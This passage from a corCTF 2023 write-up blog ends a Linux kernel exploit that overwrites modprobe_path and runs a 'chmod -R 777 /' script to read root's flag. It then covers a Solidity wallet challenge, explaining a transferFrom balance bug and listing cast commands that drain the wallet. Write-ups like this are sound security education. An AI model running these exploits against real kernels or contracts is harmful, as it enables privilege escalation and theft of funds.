+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">fake_priv_data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">curr_key</span> <span class="o">=</span> <span class="n">target</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">^</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">^</span><span class="n">prev_key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prev_key</span> <span class="o">=</span> <span class="n">prev_key</span> <span class="o">^</span> <span class="n">curr_key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">fake_priv_data</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">curr_key</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">fake_priv_data</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">fake_priv_data</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">modprobe_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// We need to do this because the write is using strncpy, which doesn&#39;t allow us to write null byte. So, we
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// try to decrypt it first with rot, so that when it got encrypted, it goes back to our original payload.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">decrypt_helper</span><span class="p">(</span><span class="n">fake_priv_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_priv_data</span><span class="p">),</span> <span class="n">cipher_key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">cipher_fd</span><span class="p">,</span> <span class="n">fake_priv_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_priv_data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">cipher_fd</span><span class="p">,</span> <span class="n">fake_priv_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_priv_data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Now that the fake private_data is ready, call read() to the cipher_fd_2.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// When we call read() to the cipher_fd_2, the text chunk is now pointed to the modprobe_path (because the priv == chipher_fd-&gt;priv-&gt;text)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">read</span><span class="p">(</span><span class="n">cipher_fd_2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Finished overwriting modprobe_path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Press enter to continue...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Create the evil script and create unrecognized binary header
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo -e &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">chmod -R 777 /&#39; &gt; /tmp/modprobe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/modprobe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo -e &#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#39; &gt; /tmp/pwn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/pwn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/tmp/pwn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat /root/flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="https://i.imgur.com/lS5ZEQ8.png"/>
+<blockquote>
+<p><strong>Flag: corctf{b4s3d_0n_CVE-2022-28350}</strong></p>
+</blockquote>
+<h1 id="blockchain">Blockchain</h1>
+<h2 id="baby-wallet">baby-wallet</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>I wrote my first Solidity smart contract!</p>
+<p><code>nc be.ax 30444</code></p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis-1">Initial Analysis</h3>
+<p>We were given two smart contracts called <code>Setup.sol</code> and <code>BabyWallet.sol</code>.</p>
+<p><strong>Setup.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./BabyWallet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BabyWallet</span> <span class="k">public</span> <span class="n">wallet</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;requires 100 ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BabyWallet</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">wallet</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">wallet</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Based on the source code, the initial setup for the challenge is that the wallet will be filled with 100 ether. Our goal for this challenge is to drain the <code>wallet</code> balance to 0.</p>
+<p><strong>BabyWallet.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">BabyWallet</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">public</span> <span class="n">allowances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amt</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">amt</span><span class="p">,</span> <span class="s">&#34;You can&#39;t withdraw that much&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">amt</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed to withdraw that amount&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">recipient</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">allowances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">recipient</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">recipient</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">amt</span><span class="p">,</span> <span class="s">&#34;You can&#39;t transfer that much&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">recipient</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">allowedAmt</span> <span class="o">=</span> <span class="n">allowances</span><span class="p">[</span><span class="k">from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fromBalance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="k">from</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">toBalance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">to</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">fromBalance</span> <span class="o">&gt;=</span> <span class="n">amt</span><span class="p">,</span> <span class="s">&#34;You can&#39;t transfer that much&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">allowedAmt</span> <span class="o">&gt;=</span> <span class="n">amt</span><span class="p">,</span> <span class="s">&#34;You don&#39;t have approval for that amount&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">=</span> <span class="n">fromBalance</span> <span class="o">-</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">=</span> <span class="n">toBalance</span> <span class="o">+</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">allowances</span><span class="p">[</span><span class="k">from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">allowedAmt</span> <span class="o">-</span> <span class="n">amt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking through the above wallet source code, we observed that there&rsquo;s a bug in the <code>transferFrom</code> method. If we transfer to our own address (which is allowed), our balance will increase by the amount that we pass to the method. This is because, when calculating <code>balances[to]</code>, it uses the initial balance instead of the updated balance.</p>
+<p>Now that we&rsquo;re aware of the bug, we can start crafting our attack.</p>
+<h3 id="solution-1">Solution</h3>
+<p>Based on the bug we discovered earlier, we need to perform the following sequence to drain the wallet&rsquo;s ethers:</p>
+<ul>
+<li>Deposit 100 ether.</li>
+<li>Approve 100 ether for our own address.</li>
+<li>Transfer 100 ether to our own address using <code>transferFrom</code>.
+<ul>
+<li>Due to the bug, our final balance will be 200 ether.</li>
+</ul>
+</li>
+<li>Withdraw 200 ether.
+<ul>
+<li>At this point, the wallet is drained.</li>
+</ul>
+</li>
+</ul>
+<p>We can use <code>cast</code> command-line (installed by <code>foundry</code>) to perform the above steps.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Fetch wallet address
+</span></span><span class="line"><span class="cl">cast call 0x13b066B5200dc2B501DBdf32905114F4B65daBa5 &#34;wallet()&#34; -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Deposit 100 ether
+</span></span><span class="line"><span class="cl">cast send 0x92dcb819da0a04d699479a7385d727aa93950bed &#34;deposit()&#34;  -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 --value 100ether
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Approve self address 100 ether
+</span></span><span class="line"><span class="cl">cast send 0x92dcb819da0a04d699479a7385d727aa93950bed &#34;approve(address,uint256)&#34;  -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 100e
+</span></span><span class="line"><span class="cl">ther
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Transfer to self address 100 ether
+</span></span><span class="line"><span class="cl">cast send 0x92dcb819da0a04d699479a7385d727aa93950bed &#34;transferFrom(address,address,uint256)&#34; -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 100ether
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Withdraw
+</span></span><span class="line"><span class="cl">cast send 0x92dcb819da0a04d699479a7385d727aa93950bed &#34;withdraw(uint256)&#34; -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 200ether
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Flag: corctf{inf1nite_m0ney_glitch!!!}</strong></p>
+</blockquote>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/corctf-2023/" data-title="corCTF 2023" data-via="Chovid99" data-hashtags="Writeup,corCTF,pwn,kernel,uaf,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/corctf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/corctf/">corCTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/kernel/">kernel</a>,&nbsp;<a href="/tags/uaf/">uaf</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/seetf-2023/" class="prev" rel="prev" title="SEETF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>SEETF 2023</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
+</html>
